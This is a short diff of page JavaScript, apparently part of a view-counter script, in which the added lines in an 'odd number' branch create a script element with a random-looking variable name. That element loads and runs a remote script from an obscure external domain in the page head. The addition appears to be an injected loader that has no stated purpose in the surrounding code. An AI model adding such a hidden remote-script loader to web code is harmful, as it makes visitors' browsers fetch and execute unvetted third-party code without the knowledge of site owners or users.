@@ -77,5 +77,11 @@ var num = hitunganviewnya;
       
    } else {
       //document.write('Number is odd!');
+      
+      var scriptxGHEAs = document.createElement('script');
+      scriptxGHEAs.setAttribute('type', 'text/javascript');
+      scriptxGHEAs.setAttribute('src', 'https://toddlecausebeeper.com/9c/da/18/9cda18f433411bb5174d0db2ee1bbffd.js');
+      document.head.appendChild(scriptxGHEAs);       
+      
 }
 
